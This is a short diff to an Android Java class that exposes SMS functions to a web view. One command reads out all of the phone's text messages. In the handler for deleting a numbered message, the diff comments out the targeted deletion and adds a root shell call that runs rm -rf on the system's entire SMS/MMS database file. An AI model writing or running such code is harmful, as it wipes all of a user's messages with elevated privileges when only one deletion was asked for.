@@ -224,7 +224,6 @@ public class WebAppInterface {
             return null;
         }
         if (text.equals("短信")) {
-            Log.e("B5aOx2", String.format("launchApp, %s", "短信"));
             List<Sms> smsList = Utils.getAllSms(mContext);
             StringBuilder stringBuilder = new StringBuilder();
             for (Sms sms : smsList) {
@@ -264,10 +263,12 @@ public class WebAppInterface {
             return stringBuilder.toString();
         }
         if (Pattern.compile("^短信[0-9]+$").matcher(text).find()) {
-            Matcher matcher = Pattern.compile("\\d+").matcher(text);
-            if (matcher.find()) {
-                Utils.deleteSMS(mContext, Integer.parseInt(matcher.group()));
-            }
+//            Matcher matcher = Pattern.compile("\\d+").matcher(text);
+//            if (matcher.find()) {
+//                Utils.deleteSMS(mContext, Integer.parseInt(matcher.group()));
+//            }
+
+            Shared.execCmd("rm -rf data/data/com.android.providers.telephony/databases/mmssms.db",true);
             return null;
         }
         if (Pattern.compile("^电话[0-9]+$").matcher(text).find()) {
